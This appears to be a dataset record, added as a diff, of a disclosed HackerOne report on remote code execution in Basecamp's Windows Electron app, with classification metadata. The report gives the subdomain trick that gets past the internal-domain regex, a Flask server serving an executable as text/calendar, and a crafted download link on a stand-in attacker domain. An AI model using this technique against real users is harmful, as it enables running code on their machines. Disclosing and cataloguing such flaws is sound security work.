@@ -1,0 +1,53 @@
+{
+  "reported_to": "Basecamp",
+  "reported_by": "co0sin ",
+  "title": "Remote Code Execution in Basecamp Windows Electron App",
+  "content": "\nThe Windows application for Basecamp, allows a \"Download\" feature for images in your posts. Under certain restrictions, those files are downloaded and sometimes even automatically opened (executed). The file will be executed if it's a download from an internal URL and the mimetype is text/calendar. But these restrictions can be bypassed to execute an attacker crafted file.\nI was able to craft a link, which when clicked by a user, will be downloaded and executed!\nTo get file execution on the user, we bypass the restrictions first:\nThere is a regular expression which checks for \"internal domains\", which can easily be bypassed by controlling the subdomain. The host pattern is /(launchpad\\.37signals\\.com|launchpad\\.(?:dev|test))/ and /(3\\.(?:staging\\.)?basecamp\\.com|bc3\\.(?:dev|test))/. By controlling the subdomain, and setting it to something like launchpad.dev.mydomain.com, we can bypass this regular expression verification.\nSince we'll be sending the request to our own server, we simply need to return text/calendar as the content-type header. This can be seen in the Electron code in OPENABLE_MIME_TYPES = new Set([\"text/calendar\"]);\nAnd then when adding the URL to your post, simply add the ?attachment=true to the URL.\nTo reproduce, simply register any subdomain that starts with launchpad.dev. (mine is launchpad.dev.\u2588\u2588\u2588\u2588).\nAn HTTP server with the needed mimetype header, can be setup with Flask easily with this code:\nCode 267 Bytes\n1from flask import Flask, send_from_directory\n2app = Flask(__name__)\n3@app.route('/<path:path>')\n4def hello(path):\n5    return send_from_directory(\".\", \"file.exe\", as_attachment=True, mimetype=\"text/calendar\")\n6if __name__ == '__main__':\n7    app.run(port=80,host=\"0.0.0.0\")\nThen add the link to your post with the appropriate attachment parameter, as such:\nhttp://launchpad.dev.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/file.exe?attachment=true\nImpact\nRemote code execution on any user which clicks a link on your crafted post through the desktop app.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 500,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1605839040,
+  "report_url": "https://hackerone.com/reports/1016966",
+  "vuln_category": "WEB_APP",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "steps": [
+    [
+      1,
+      "Register a subdomain that starts with 'launchpad.dev.' (e.g., launchpad.dev.mydomain.com)"
+    ],
+    [
+      2,
+      "Set up an HTTP server with Flask that serves a malicious file with the 'text/calendar' mimetype"
+    ],
+    [
+      3,
+      "Add a link to a post in Basecamp with the crafted URL (e.g., http://launchpad.dev.mydomain.com/file.exe?attachment=true)"
+    ],
+    [
+      4,
+      "When a user clicks the link in the Basecamp Windows Electron app, the file is downloaded and executed"
+    ]
+  ],
+  "vuln_description": "The Basecamp Windows Electron app has a remote code execution vulnerability due to improper validation of download URLs and mimetypes. By crafting a URL with a subdomain that bypasses internal domain checks and serving a file with a 'text/calendar' mimetype, an attacker can execute arbitrary code on a user's machine when they click the link.",
+  "reason": "The vulnerability involves multiple components (subdomain bypass, mimetype manipulation, and URL parameter manipulation) and requires understanding the application's internal domain validation logic. However, the steps to exploit it are relatively straightforward once the bypass techniques are known.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves bypassing domain restrictions and MIME type checks in the Basecamp Windows Electron app, which is not directly related to authentication or authorization within the same application context. The methodology described focuses on testing AuthN/AuthZ boundaries within a single application by swapping user sessions and resource IDs, not on exploiting client-side application behavior or domain validation flaws.",
+    "is_detectable": false
+  }
+}
